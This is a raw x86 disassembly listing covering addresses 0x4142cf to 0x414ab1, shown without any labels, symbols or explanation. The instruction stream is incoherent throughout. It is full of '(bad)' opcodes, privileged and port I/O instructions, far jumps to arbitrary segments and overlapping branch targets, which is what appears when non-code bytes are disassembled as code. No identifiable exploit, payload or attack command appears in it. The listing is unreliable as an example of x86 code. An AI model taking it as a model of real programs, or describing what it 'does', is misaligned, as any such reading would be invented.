  4142cf:	aas    
  4142d0:	popa   
  4142d1:	faddp  st(0),st
  4142d3:	jae    0x41432d
  4142d5:	call   0x1363:0xa235a5ce
  4142dc:	jns    0x414335
  4142de:	dec    esp
  4142df:	iret   
  4142e0:	loopne 0x414327
  4142e2:	jg     0x4142b1
  4142e4:	sub    edi,DWORD PTR [edi+0x5c]
  4142e7:	pop    ss
  4142e8:	aad    0xea
  4142ea:	fisubr WORD PTR [esi+0x56e19639]
  4142f0:	in     eax,0xf9
  4142f2:	into   
  4142f3:	int    0xc1
  4142f5:	(bad)  
  4142f6:	mov    WORD PTR [esp+ebp*1+0x3016c6d7],fs
  4142fd:	or     eax,0x590e0076
  414302:	call   0x444aacef
  414307:	pop    ds
  414308:	bound  ebp,QWORD PTR [ebp-0x68]
  41430b:	xchg   edi,eax
  41430c:	sub    bh,BYTE PTR [edx]
  41430e:	add    ebp,ebx
  414310:	ds push ecx
  414312:	or     eax,DWORD PTR [eax+0x36]
  414315:	lods   al,BYTE PTR ds:[esi]
  414316:	ss adc eax,0x24fc29c1
  41431c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41431d:	cmp    al,ah
  41431f:	aam    0xa0
  414321:	nop
  414322:	cdq    
  414323:	mov    ebp,0x5e4597c
  414328:	jge    0x4142f9
  41432a:	push   ebx
  41432b:	jp     0x4142e8
  41432d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41432e:	mov    ecx,0x35cfb617
  414333:	(bad)  
  414334:	adc    DWORD PTR [eax+0x2d2fa5b8],esi
  41433a:	cdq    
  41433b:	push   esi
  41433c:	das    
  41433d:	and    ebp,edi
  41433f:	aaa    
  414340:	mov    edx,0x5f516f99
  414345:	out    0x17,al
  414347:	cmc    
  414348:	ins    BYTE PTR es:[edi],dx
  414349:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41434b:	pop    esi
  41434c:	xchg   edx,eax
  41434d:	imul   edi,DWORD PTR [eax-0x177948c0],0x14
  414354:	or     BYTE PTR [edx],dh
  414356:	and    BYTE PTR [eax+eiz*4],bl
  414359:	pop    es
  41435a:	or     eax,0xdef4e257
  41435f:	and    eax,0x2c280bab
  414364:	mov    al,0x8
  414366:	inc    edx
  414367:	lods   al,BYTE PTR ds:[esi]
  414368:	jge    0x414372
  41436a:	mov    edi,0xf1a0cb83
  41436f:	inc    edi
  414370:	ins    DWORD PTR es:[edi],dx
  414371:	adc    eax,0x6e596902
  414376:	lock xor bh,BYTE PTR [ebx]
  414379:	add    al,0x68
  41437b:	push   esi
  41437c:	dec    esi
  41437d:	(bad)  [ecx]
  41437f:	xchg   BYTE PTR [ebx],ch
  414381:	or     BYTE PTR [edi-0x8696f8c],0x8f
  414388:	call   0x7469fb44
  41438d:	(bad)  
  41438e:	les    eax,FWORD PTR [edi-0x7f]
  414391:	pop    ecx
  414392:	sub    DWORD PTR [eax+0x3e],0xffffffcc
  414396:	call   0xc527:0x64026c2d
  41439d:	dec    cl
  41439f:	aaa    
  4143a0:	mov    DWORD PTR [edx+0x6e],ebx
  4143a3:	jne    0x4143e6
  4143a5:	mov    bl,0xfc
  4143a7:	mov    al,ds:0xd546c0fd
  4143ac:	call   0xe56e:0x6ca73027
  4143b3:	mov    DWORD PTR [edi+0x31d6de5f],ecx
  4143b9:	mov    al,ds:0x884d9cf2
  4143be:	adc    esp,DWORD PTR [edx+0x5]
  4143c1:	loopne 0x4143fe
  4143c3:	adc    ah,al
  4143c5:	sub    al,0x66
  4143c7:	in     al,0xcd
  4143c9:	hlt    
  4143ca:	push   esp
  4143cb:	jnp    0x4143b7
  4143cd:	sub    eax,DWORD PTR [eax]
  4143cf:	stos   DWORD PTR es:[edi],eax
  4143d0:	aad    0x39
  4143d2:	(bad)  
  4143d3:	aas    
  4143d4:	lds    esi,FWORD PTR es:[edx+0x31]
  4143d8:	jmp    0x5cb5:0x8af7cc01
  4143df:	push   ebp
  4143e1:	retf   
  4143e2:	dec    edx
  4143e4:	dec    ebx
  4143e5:	ficom  DWORD PTR [ebx+ebp*1-0x32]
  4143e9:	dec    ecx
  4143ea:	lahf   
  4143eb:	loop   0x41442e
  4143ed:	mov    ecx,0xa241a63b
  4143f2:	adc    BYTE PTR [eax+0x2f1d288c],0x71
  4143f9:	mov    dh,0x92
  4143fb:	ds xchg esp,eax
  4143fd:	aas    
  4143fe:	int    0x15
  414400:	or     cl,BYTE PTR [edi]
  414402:	test   eax,0x1cd37cbc
  414407:	or     eax,0xa008f7d2
  41440c:	adc    DWORD PTR [eax],0x71
  41440f:	shr    DWORD PTR [edx+0x1],cl
  414412:	inc    ebx
  414413:	imul   ebp,esp,0x107460a0
  414419:	outs   dx,DWORD PTR ds:[esi]
  41441a:	and    DWORD PTR [edx+0x1f],esp
  41441d:	mov    bl,0x2f
  41441f:	idiv   BYTE PTR [ecx-0x291dba2b]
  414425:	inc    edx
  414426:	or     bl,BYTE PTR [edx]
  414428:	je     0x4144a4
  41442a:	scas   al,BYTE PTR es:[edi]
  41442b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41442c:	(bad)  
  41442e:	loopne 0x4144a7
  414430:	or     bl,BYTE PTR [edi-0x2f]
  414433:	pop    ss
  414434:	mov    ebp,0xba794195
  414439:	mov    al,ds:0x3dc3230
  41443e:	rcl    bh,0x5c
  414441:	addr16 dec ecx
  414443:	or     esi,DWORD PTR [esi+eax*2]
  414446:	sar    BYTE PTR [esi],0x1e
  414449:	mov    edi,0x50723e0
  41444e:	dec    edx
  41444f:	xlat   BYTE PTR ds:[ebx]
  414450:	xor    bl,BYTE PTR [ebx]
  414452:	xor    BYTE PTR [edi],bl
  414454:	add    DWORD PTR [edx+0x654aa293],0xffffff9b
  41445b:	hlt    
  41445c:	and    al,0xe7
  41445e:	pop    ds
  41445f:	fsubr  st(3),st
  414461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414462:	dec    esp
  414463:	mov    eax,0x77f42028
  414468:	adc    cl,BYTE PTR [esi]
  41446a:	imul   ebp,eax,0x0
  41446d:	sbb    eax,0x5629156a
  414472:	stos   BYTE PTR es:[edi],al
  414473:	mov    ah,0xa1
  414475:	js     0x4144e6
  414477:	and    al,0xb9
  414479:	scas   al,BYTE PTR es:[edi]
  41447a:	rcl    BYTE PTR [ecx],1
  41447c:	pusha  
  41447d:	stc    
  41447e:	js     0x414445
  414480:	int    0xa0
  414482:	shl    BYTE PTR [ecx+ecx*8+0x11],0x16
  414487:	gs mov esi,0x5b2a5630
  41448d:	mov    ecx,0x782caa5e
  414492:	in     eax,dx
  414493:	mov    edi,DWORD PTR [eax-0x2a16a7b3]
  414499:	inc    edx
  41449a:	push   edi
  41449b:	fucomp st(1)
  41449d:	push   edx
  41449e:	mov    edi,0x61b38902
  4144a3:	into   
  4144a4:	xchg   BYTE PTR ds:0x7480b2f5,bh
  4144aa:	jbe    0x414464
  4144ac:	ret    0xf3a9
  4144af:	call   0x8467:0xab6607c9
  4144b6:	jg     0x414507
  4144b8:	call   0x1e056136
  4144bd:	mov    cl,0xda
  4144bf:	push   esp
  4144c0:	inc    ebx
  4144c1:	push   edi
  4144c2:	aad    0xc
  4144c4:	les    eax,FWORD PTR [eax+ebx*8+0x2c9c3cdf]
  4144cb:	pop    eax
  4144cc:	shr    DWORD PTR [esi+esi*4],0x52
  4144d0:	in     eax,dx
  4144d1:	lods   al,BYTE PTR gs:[esi]
  4144d3:	lods   al,BYTE PTR ds:[esi]
  4144d4:	sub    DWORD PTR [eax],ecx
  4144d6:	fnstcw WORD PTR [eax+ebx*4+0xe]
  4144da:	mov    ebx,0xe2697f3b
  4144df:	add    DWORD PTR [esi+ecx*2],ecx
  4144e2:	xor    al,0x8e
  4144e4:	cmp    eax,0x8fcd4e81
  4144e9:	ds stc 
  4144eb:	xor    al,0x17
  4144ed:	inc    ecx
  4144ee:	scas   al,BYTE PTR es:[edi]
  4144ef:	test   al,0xcc
  4144f1:	repnz aad 0xdf
  4144f4:	mov    eax,0x174894f4
  4144f9:	imul   esi,DWORD PTR [edi],0x4e88b2da
  4144ff:	adc    eax,0x6bb09760
  414504:	mov    ecx,0x487c2822
  414509:	test   eax,eax
  41450b:	mul    DWORD PTR [esp+esi*4+0x19]
  41450f:	cs or  eax,0xc44f3673
  414515:	fiadd  WORD PTR [ecx+0x27008a5a]
  41451b:	leave  
  41451c:	(bad)  
  41451d:	out    dx,al
  41451e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41451f:	push   ds
  414520:	and    al,BYTE PTR [esi-0x3c54549f]
  414526:	jmp    0x4144f2
  414528:	not    DWORD PTR [eax-0x4bd223f6]
  41452e:	pop    ecx
  41452f:	bound  edi,QWORD PTR [edi+ebp*2+0x534a0730]
  414536:	pop    ebp
  414537:	in     al,dx
  414538:	xchg   edx,eax
  414539:	std    
  41453a:	pop    ebx
  41453b:	das    
  41453c:	ins    BYTE PTR es:[edi],dx
  41453d:	mov    dh,0x99
  41453f:	retf   
  414540:	fistp  QWORD PTR [esi+0x57]
  414543:	jb     0x414517
  414545:	enter  0x8764,0x72
  414549:	mov    dl,0x14
  41454b:	shl    BYTE PTR [ebx+0x5c],cl
  41454e:	jecxz  0x414512
  414550:	das    
  414551:	adc    ch,BYTE PTR [ecx]
  414553:	xlat   BYTE PTR ds:[ebx]
  414554:	mov    ds:0x819e5e28,eax
  414559:	mov    al,0x6
  41455b:	out    dx,al
  41455c:	popa   
  41455d:	ja     0x41455f
  41455f:	jge    0x41453c
  414561:	inc    edx
  414562:	or     BYTE PTR [eax],0xf5
  414565:	loopne 0x4145bf
  414567:	inc    edi
  414568:	sub    edx,DWORD PTR [ecx+0x21]
  41456b:	test   BYTE PTR [esi+0x3c],0x3a
  41456f:	mov    dh,0xb6
  414571:	fnsave [ebx+edx*2-0x25]
  414575:	dec    ebp
  414576:	push   ss
  414577:	sbb    BYTE PTR [edx],0x4c
  41457a:	bound  ecx,QWORD PTR [ebx-0x772c2dc3]
  414580:	fdiv   QWORD PTR [edi]
  414582:	or     al,0x55
  414584:	stos   BYTE PTR es:[edi],al
  414585:	inc    ebp
  414586:	cdq    
  414587:	inc    esi
  414588:	ret    
  414589:	fs ins BYTE PTR es:[edi],dx
  41458b:	fsubrp st(3),st
  41458d:	or     DWORD PTR [ebx+0x3d],0xb95ea9be
  414594:	cs jle 0x414545
  414597:	into   
  414598:	lock mov dh,0xc4
  41459b:	mov    al,ds:0x862d6660
  4145a0:	sbb    dh,BYTE PTR [edx-0x30aebeac]
  4145a6:	lahf   
  4145a7:	or     DWORD PTR [edi+0x61],edx
  4145aa:	xchg   ebp,eax
  4145ab:	mov    bl,0x8b
  4145ad:	into   
  4145ae:	dec    edx
  4145af:	xchg   ecx,eax
  4145b0:	mov    eax,ds:0x9dc071
  4145b5:	je     0x4145df
  4145b7:	mov    WORD PTR [edx+0x4c3a69c7],gs
  4145bd:	jl     0x4145fc
  4145bf:	out    dx,eax
  4145c0:	aas    
  4145c1:	adc    bh,BYTE PTR [edi-0x794e2c65]
  4145c7:	or     ch,BYTE PTR [ebx+0x28fd8caa]
  4145cd:	mov    esp,0xbe8318a8
  4145d2:	jno    0x4145db
  4145d4:	shl    ebx,1
  4145d6:	clc    
  4145d7:	mov    ?,WORD PTR [esi+0xbe58cfd]
  4145dd:	adc    edi,DWORD PTR [esi]
  4145df:	je     0x4145f4
  4145e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145e2:	pop    ebp
  4145e3:	fisttp DWORD PTR [eax]
  4145e5:	ds scas eax,DWORD PTR es:[edi]
  4145e7:	xor    BYTE PTR [edi],ch
  4145e9:	stos   DWORD PTR es:[edi],eax
  4145ea:	in     eax,dx
  4145eb:	(bad)  
  4145ec:	xchg   BYTE PTR ss:[ebx+ebx*4+0x4b],bh
  4145f1:	add    eax,DWORD PTR ds:0xf4c077e0
  4145f7:	hlt    
  4145f8:	call   0x6157d8c
  4145fd:	push   esp
  4145fe:	aad    0xac
  414600:	pushf  
  414601:	and    esp,DWORD PTR ds:0x4d749dde
  414607:	inc    edi
  414608:	mov    bh,0xcc
  41460a:	jo     0x414655
  41460c:	adc    ebp,eax
  41460e:	lahf   
  41460f:	lods   eax,DWORD PTR ds:[esi]
  414610:	retf   0x1597
  414613:	xor    edx,esi
  414615:	jle    0x41462a
  414617:	cmp    DWORD PTR [eax-0x63],0xffffffab
  41461b:	pop    ecx
  41461c:	das    
  41461d:	xor    DWORD PTR [ecx+ecx*1-0x390e7c4a],ecx
  414624:	pop    ecx
  414625:	sub    esp,DWORD PTR [ebx-0x4fe9a71d]
  41462b:	not    DWORD PTR ds:0x79763ef5
  414631:	mov    cl,0x38
  414633:	ins    DWORD PTR es:[edi],dx
  414634:	enter  0x7f5b,0xf3
  414638:	lahf   
  414639:	scas   al,BYTE PTR es:[edi]
  41463a:	out    dx,al
  41463b:	or     eax,0xf049ae64
  414640:	sub    eax,0xb98fcb10
  414645:	push   eax
  414646:	pusha  
  414647:	icebp  
  414648:	jmp    0x1d75:0x58ebafd7
  41464f:	out    dx,eax
  414650:	lock dec BYTE PTR [edx]
  414653:	adc    ecx,ebp
  414655:	call   0x3e203eb5
  41465a:	mov    ds:0x7b764362,eax
  41465f:	dec    ebp
  414660:	or     eax,DWORD PTR [esi+ecx*1-0x24]
  414664:	xor    edx,ebx
  414666:	mov    ecx,0x151d559b
  41466b:	push   cs
  41466c:	loop   0x4146a0
  41466e:	cld    
  41466f:	mov    eax,ds:0x59335bb3
  414674:	xchg   DWORD PTR [edx],ebx
  414676:	sbb    BYTE PTR [edi-0x6c33543],al
  41467c:	mov    cl,0x29
  41467e:	xor    ch,dl
  414680:	test   DWORD PTR [eax+0x1c8f8dbe],esi
  414686:	loop   0x41469a
  414688:	mov    eax,0x2c492290
  41468d:	sub    BYTE PTR [ecx+0x3e],al
  414690:	xchg   esp,eax
  414691:	rcr    BYTE PTR ds:[eax+ebp*8],1
  414695:	cmp    al,0x21
  414697:	inc    edi
  414698:	cmp    al,0x8d
  41469a:	push   ecx
  41469b:	pop    ebp
  41469c:	mov    ebx,0xd358a13e
  4146a1:	les    esp,FWORD PTR [edx-0x66aa42d0]
  4146a7:	jmp    0x9b8afee5
  4146ac:	fld    TBYTE PTR [ecx-0x1036e601]
  4146b2:	xchg   esp,eax
  4146b3:	(bad)  
  4146b5:	push   esp
  4146b6:	lea    edi,[esi-0x47553525]
  4146bc:	cmovg  esi,DWORD PTR [esi+eiz*4-0x610fef62]
  4146c4:	cmp    ah,dl
  4146c6:	(bad)  
  4146c7:	clc    
  4146c8:	push   ecx
  4146c9:	fist   DWORD PTR [edi]
  4146cb:	pop    edi
  4146cc:	sti    
  4146cd:	(bad)  
  4146ce:	sbb    edi,ebp
  4146d0:	push   es
  4146d1:	sahf   
  4146d2:	add    dh,dh
  4146d4:	inc    esi
  4146d5:	push   esp
  4146d6:	inc    eax
  4146d7:	or     eax,0xd402daaa
  4146dc:	inc    esi
  4146dd:	dec    esi
  4146de:	loope  0x4146cf
  4146e0:	cmovno ecx,eax
  4146e3:	ss mov ah,0xa9
  4146e6:	sbb    DWORD PTR [edx+0x47],esp
  4146e9:	mov    ds:0x7717113,eax
  4146ee:	iret   
  4146ef:	retf   0xda38
  4146f2:	dec    ecx
  4146f3:	sbb    ecx,DWORD PTR [eax+0x19]
  4146f6:	xchg   ebx,eax
  4146f7:	aas    
  4146f8:	call   FWORD PTR [edi+0x1612d3a]
  4146fe:	das    
  4146ff:	pop    edx
  414700:	add    BYTE PTR [eax-0x3d],cl
  414703:	sub    eax,DWORD PTR [esi+0x72f00166]
  414709:	out    dx,al
  41470a:	xchg   esi,eax
  41470b:	pop    ds
  41470c:	pop    ecx
  41470d:	dec    esp
  41470e:	out    dx,eax
  41470f:	fdiv   DWORD PTR [eax]
  414711:	in     eax,dx
  414712:	or     BYTE PTR [eax+0x30],bh
  414715:	test   eax,0xffdae39b
  41471a:	jmp    0x4146e8
  41471c:	push   ebp
  41471d:	sub    al,BYTE PTR [bp+di+0x5a]
  414721:	ins    DWORD PTR es:[edi],dx
  414722:	adc    BYTE PTR [ecx],dl
  414724:	dec    esp
  414725:	xor    BYTE PTR [ebx+esi*8+0x47],0x67
  41472a:	(bad)
  41472d:	add    ch,bl
  41472f:	pop    ebp
  414730:	cmc    
  414731:	popf   
  414732:	div    DWORD PTR [eax]
  414734:	and    bh,BYTE PTR [edi+eax*8-0x6]
  414738:	cdq    
  414739:	add    dl,BYTE PTR [esi+0x6]
  41473c:	sub    eax,0xc06d6571
  414741:	jnp    0x414783
  414743:	in     eax,0x7
  414745:	inc    edi
  414746:	mov    dh,0xa0
  414748:	fs icebp 
  41474a:	retf   
  41474b:	mov    ebx,0x5f6c28f2
  414750:	mov    ebx,0x2b756852
  414755:	(bad)  
  414756:	out    dx,eax
  414757:	fisubr DWORD PTR [eax]
  414759:	mov    WORD PTR [ecx-0x11b97399],?
  41475f:	mov    eax,0x8c8d7d11
  414764:	sbb    bl,BYTE PTR [ebx+0x33]
  414767:	adc    ebx,DWORD PTR [ebx]
  414769:	stc    
  41476a:	jmp    0x859eef67
  41476f:	dec    edx
  414770:	mov    esp,0xfc9993e
  414775:	and    DWORD PTR ds:0x10c9e977,ebx
  41477b:	pop    ss
  41477c:	mov    ss,WORD PTR [ecx]
  41477e:	test   al,0xb7
  414780:	adc    al,BYTE PTR [ebx+0x15]
  414783:	daa    
  414784:	inc    edx
  414785:	loope  0x4147ec
  414787:	aad    0xfd
  414789:	add    DWORD PTR [ebp-0x3],ebx
  41478c:	popf   
  41478d:	std    
  41478e:	add    eax,0xf79dcee6
  414793:	in     eax,0xbe
  414795:	xor    BYTE PTR es:[ebx],ch
  414798:	outs   dx,DWORD PTR ds:[esi]
  414799:	add    ebx,DWORD PTR [edi+edi*2]
  41479c:	mov    es,WORD PTR [ebx+eax*1-0x79270ea8]
  4147a3:	mov    ch,0xb7
  4147a5:	inc    edi
  4147a6:	pop    ss
  4147a7:	sbb    eax,0x3a19b45c
  4147ac:	ss (bad) 
  4147ae:	jl     0x4147be
  4147b0:	mov    ds:0x42dce2ac,al
  4147b5:	and    BYTE PTR [ebx+edx*8-0x304902a8],0x21
  4147bd:	addr16 mov al,0x77
  4147c0:	repz in al,0x90
  4147c3:	nop
  4147c4:	test   al,0x84
  4147c6:	jns    0x4147ca
  4147c8:	stc    
  4147c9:	imul   esp,DWORD PTR [ebx+0x25d4ba1e],0x87e58467
  4147d3:	loopne 0x414812
  4147d5:	push   cs
  4147d6:	push   ebp
  4147d7:	mov    ah,0xa
  4147d9:	inc    ecx
  4147da:	push   esp
  4147db:	cmp    eax,0x35fcfc63
  4147e0:	(bad)  
  4147e1:	arpl   WORD PTR [esi],bp
  4147e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147e4:	outs   dx,BYTE PTR ds:[esi]
  4147e5:	xor    al,dh
  4147e7:	jb     0x4147be
  4147e9:	mov    ?,edi
  4147eb:	xchg   DWORD PTR [esi-0x39],edi
  4147ee:	push   esi
  4147ef:	leave  
  4147f0:	push   edi
  4147f1:	jnp    0x414775
  4147f3:	adc    esp,0x79
  4147f6:	and    ch,dl
  4147f8:	xchg   DWORD PTR [edi-0x75c7b84],edx
  4147fe:	ins    BYTE PTR es:[edi],dx
  4147ff:	and    BYTE PTR [edi-0x33],ch
  414802:	lods   al,BYTE PTR ds:[esi]
  414803:	fisttp QWORD PTR [eax]
  414805:	data16 sti 
  414807:	scas   eax,DWORD PTR es:[edi]
  414808:	aaa    
  414809:	scas   al,BYTE PTR es:[edi]
  41480a:	daa    
  41480b:	aam    0xf0
  41480d:	idiv   ecx
  41480f:	ja     0x414869
  414811:	cmp    edi,edi
  414813:	xchg   edx,eax
  414814:	fiadd  WORD PTR [esi+0x14]
  414817:	sub    BYTE PTR [edi-0x6d],ah
  41481a:	sar    BYTE PTR [eax],0x91
  41481d:	xchg   edx,eax
  41481e:	xchg   esp,eax
  41481f:	in     eax,dx
  414820:	mov    cl,0x69
  414822:	arpl   WORD PTR [ebp-0x16],di
  414825:	hlt    
  414826:	mov    bh,0x10
  414828:	je     0x414895
  41482a:	out    dx,eax
  41482b:	pop    ecx
  41482c:	adc    DWORD PTR [eax+0x4ab0017],edi
  414832:	pop    ss
  414833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414834:	inc    edi
  414835:	sub    BYTE PTR [eax-0x3e],0x15
  414839:	aam    0x24
  41483b:	or     cl,cl
  41483d:	sar    BYTE PTR [edi],cl
  41483f:	test   BYTE PTR [ecx],ah
  414841:	aaa    
  414842:	cli    
  414843:	pop    edi
  414844:	mov    dh,ch
  414846:	dec    edx
  414847:	mov    WORD PTR [ecx],gs
  414849:	mov    esi,0x15ed956
  41484e:	mov    eax,ds:0xfaeaea6f
  414853:	dec    ecx
  414854:	inc    DWORD PTR [eax-0x63]
  414857:	jmp    0xf65506ac
  41485c:	push   edi
  41485d:	mov    al,ds:0x7bd46756
  414862:	je     0x414833
  414864:	xor    ebp,ecx
  414866:	mov    al,ds:0x1e12349e
  41486b:	sbb    eax,0x78ac799b
  414870:	es jp  0x41489b
  414873:	arpl   sp,sp
  414875:	cmp    BYTE PTR [esi],dh
  414877:	pushf  
  414878:	or     BYTE PTR [ebx],al
  41487a:	xor    al,0xe0
  41487c:	adc    dh,cl
  41487e:	frstor [ebx+0x6f782371]
  414884:	jl     0x414855
  414886:	and    dl,dl
  414888:	pop    ebp
  414889:	sbb    BYTE PTR [ecx-0x13716403],0x17
  414890:	jmp    0x3e03fc5c
  414895:	(bad)
  414899:	xchg   edi,eax
  41489a:	sbb    DWORD PTR [edx-0x71e2fe3e],ecx
  4148a0:	mov    ecx,edx
  4148a2:	jle    0x41485e
  4148a4:	ins    BYTE PTR es:[edi],dx
  4148a5:	xor    BYTE PTR [edi+0x662de0dd],cl
  4148ab:	dec    ecx
  4148ac:	xchg   ebp,eax
  4148ad:	lods   al,BYTE PTR ds:[esi]
  4148ae:	and    eax,0x7f1caf2b
  4148b3:	mul    DWORD PTR [ecx-0x725f3364]
  4148b9:	out    dx,eax
  4148ba:	daa    
  4148bb:	jge    0x41489c
  4148bd:	sub    BYTE PTR [ecx-0x3c],bl
  4148c0:	add    DWORD PTR [ebx],ebp
  4148c2:	ja     0x41492a
  4148c4:	iret   
  4148c5:	sahf   
  4148c6:	adc    dl,0xe9
  4148c9:	push   es
  4148ca:	and    al,0x2d
  4148cc:	imul   eax,DWORD PTR [ecx],0xfffffff3
  4148cf:	pushf  
  4148d0:	or     DWORD PTR [ecx+edi*8+0x24a4d61b],0x6963bafc
  4148db:	pop    edx
  4148dd:	dec    eax
  4148de:	cmp    ebx,DWORD PTR [eax-0x60]
  4148e1:	add    dl,cl
  4148e3:	ds xchg edx,eax
  4148e5:	mov    edx,0xee0deb22
  4148ea:	repz es mov dl,0x60
  4148ee:	xchg   ecx,eax
  4148ef:	jb     0x41492b
  4148f1:	cmp    DWORD PTR ds:0xa1d30bf6,edi
  4148f7:	mov    dl,bl
  4148f9:	(bad)  
  4148fa:	jo     0x41493f
  4148fc:	jecxz  0x41496d
  4148fe:	sub    al,0xc8
  414900:	cmp    esp,esp
  414902:	daa    
  414903:	daa    
  414904:	bound  ecx,QWORD PTR [ecx-0x3bae3a5b]
  41490a:	popf   
  41490b:	or     ebp,eax
  41490d:	adc    BYTE PTR [esi+ebp*1],ah
  414910:	xor    ebx,0x99b369c3
  414916:	jge    0x41492a
  414918:	push   ss
  414919:	pop    ss
  41491a:	and    esi,DWORD PTR [edx+eax*2+0x25]
  41491e:	add    DWORD PTR [edi+0x44],esi
  414921:	(bad)  
  414923:	cmp    eax,0x13d71842
  414928:	mov    WORD PTR [bx+di-0x77a0],gs
  41492d:	dec    eax
  41492e:	push   ecx
  41492f:	sbb    eax,DWORD PTR [eax+0x473e7a1e]
  414935:	xchg   DWORD PTR [edx+edi*2-0x5b],ecx
  414939:	inc    edi
  41493a:	add    al,0xee
  41493c:	aas    
  41493d:	and    ch,BYTE PTR gs:[eax]
  414940:	les    eax,FWORD PTR ds:0xb9aa32f7
  414946:	nop
  414947:	sbb    esi,DWORD PTR [esi]
  414949:	mov    cl,0x99
  41494b:	dec    edi
  41494c:	aas    
  41494d:	shr    BYTE PTR ds:0xe27fa329,cl
  414953:	xchg   ebx,eax
  414954:	je     0x414921
  414956:	ficom  DWORD PTR [ecx+0x1c]
  414959:	cmc    
  41495a:	in     al,dx
  41495b:	mov    eax,ds:0x37904c34
  414960:	and    DWORD PTR [ebp+0x17c67904],esp
  414966:	test   eax,0x5c1ac76f
  41496b:	test   al,0x73
  41496d:	bound  ecx,QWORD PTR [ebx+0x151529a6]
  414973:	jecxz  0x4149a1
  414975:	cwde   
  414976:	xor    ebp,DWORD PTR [edi-0x607d6408]
  41497c:	push   esp
  41497d:	jae    0x414917
  41497f:	inc    eax
  414980:	inc    esi
  414981:	hlt    
  414982:	inc    eax
  414983:	mov    bl,0x90
  414985:	mov    al,ds:0x87397cc1
  41498a:	xchg   ebp,eax
  41498b:	(bad)  
  41498c:	jb     0x4149ae
  41498e:	imul   ebp,DWORD PTR [eax],0x2ac97bbd
  414994:	leave  
  414995:	clc    
  414996:	bound  ecx,QWORD PTR [ecx]
  414998:	push   0xffffff90
  41499a:	or     eax,0x905fe0c1
  41499f:	and    bl,bl
  4149a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a2:	setge  cl
  4149a5:	loope  0x4149bb
  4149a7:	and    esp,DWORD PTR [ecx]
  4149a9:	xor    al,0xf2
  4149ab:	jbe    0x4149d0
  4149ad:	inc    ebx
  4149ae:	sub    eax,DWORD PTR [edx-0x7bcda03f]
  4149b4:	scas   eax,DWORD PTR es:[edi]
  4149b5:	or     DWORD PTR [ecx],edx
  4149b7:	or     cl,BYTE PTR [ebx+ebx*1]
  4149ba:	mov    edx,ss
  4149bc:	enter  0x2096,0xd8
  4149c0:	sahf   
  4149c1:	ja     0x4149bd
  4149c3:	sub    DWORD PTR [edi-0xe081661],esi
  4149c9:	jbe    0x4149a9
  4149cb:	adc    edx,DWORD PTR [ecx]
  4149cd:	push   cs
  4149ce:	hlt    
  4149cf:	or     eax,DWORD PTR [ebp-0x6930d904]
  4149d5:	pop    ds
  4149d6:	sub    BYTE PTR [ebx-0x9a55dc8],0x2
  4149dd:	sahf   
  4149de:	pop    ecx
  4149df:	sub    al,0x5
  4149e1:	int3   
  4149e2:	cwde   
  4149e3:	xor    dh,BYTE PTR [eax]
  4149e5:	dec    ebp
  4149e6:	xor    bh,dh
  4149e8:	mov    edi,0x3c5955ea
  4149ed:	arpl   WORD PTR ds:0xf5cd97d5,ax
  4149f3:	out    0x29,eax
  4149f5:	push   edi
  4149f6:	cmc    
  4149f7:	shr    DWORD PTR [ebx-0x34124bc0],1
  4149fd:	into   
  4149fe:	and    cl,0x6b
  414a01:	daa    
  414a02:	sub    DWORD PTR [ebx+0x20],0xffffffcd
  414a06:	or     BYTE PTR [eax-0x10c14deb],ch
  414a0c:	mov    eax,DWORD PTR [eax+0x6558f6d1]
  414a12:	sbb    esi,esi
  414a14:	mov    bl,0x68
  414a16:	jmp    0x43c7:0xe0d403e4
  414a1d:	mov    BYTE PTR [esi],bl
  414a1f:	loopne 0x414a9e
  414a21:	mov    eax,ds:0x532d6c6d
  414a26:	sahf   
  414a27:	push   edi
  414a28:	cmp    al,0x4c
  414a2a:	push   0x6569bb45
  414a2f:	mov    ch,0xbd
  414a31:	sub    DWORD PTR [ebp+0x3f],esi
  414a34:	mov    ah,0x79
  414a36:	xchg   ecx,eax
  414a37:	(bad)  
  414a38:	ins    DWORD PTR es:[edi],dx
  414a39:	rcr    DWORD PTR [edx],1
  414a3b:	outs   dx,BYTE PTR ds:[esi]
  414a3c:	pop    edi
  414a3d:	les    edx,FWORD PTR [edx+0x4c]
  414a40:	das    
  414a41:	fldcw  WORD PTR [ebx]
  414a43:	inc    esi
  414a44:	inc    edx
  414a45:	add    eax,eax
  414a47:	in     al,dx
  414a48:	rcr    BYTE PTR [ebp+0x6f],1
  414a4b:	jo     0x414a60
  414a4d:	pop    ebx
  414a4e:	xor    DWORD PTR [ebx+eax*2],0xa795aad3
  414a55:	lods   eax,DWORD PTR ds:[esi]
  414a56:	(bad)  
  414a57:	fcmovne st,st(3)
  414a59:	test   BYTE PTR [ecx+eiz*2+0x3c],cl
  414a5d:	and    ch,bh
  414a5f:	(bad)  
  414a61:	push   0xffffffe5
  414a63:	mov    cl,0x5b
  414a65:	sub    al,0x31
  414a67:	xchg   BYTE PTR [ebp+0x5c],dh
  414a6a:	sbb    al,0xd5
  414a6c:	and    BYTE PTR [esi-0x3620a074],dl
  414a72:	push   eax
  414a73:	jne    0x414a8e
  414a75:	jp     0x414aba
  414a77:	ins    BYTE PTR es:[edi],dx
  414a78:	addr16 pop ss
  414a7a:	mov    dh,0xfc
  414a7c:	out    0xf8,al
  414a7e:	mov    ds:0xaf07170d,al
  414a83:	sbb    al,0x6c
  414a85:	and    al,0x61
  414a87:	ja     0x414a3e
  414a89:	(bad)  
  414a8a:	inc    edi
  414a8b:	stos   DWORD PTR es:[edi],eax
  414a8c:	cmp    al,0x59
  414a8e:	pop    edi
  414a8f:	jbe    0x414a52
  414a91:	add    al,0x34
  414a93:	loopne 0x414a7d
  414a95:	neg    BYTE PTR [ebx+0x4ff761d4]
  414a9b:	adc    dh,al
  414a9d:	sub    ch,BYTE PTR [ebp-0x4c7066fe]
  414aa3:	cdq    
  414aa4:	push   es
  414aa5:	imul   esi,DWORD PTR [ecx+edi*2+0x22],0xd96433c7
  414aad:	enter  0xc801,0x81
  414ab1:	add    ecx,edx
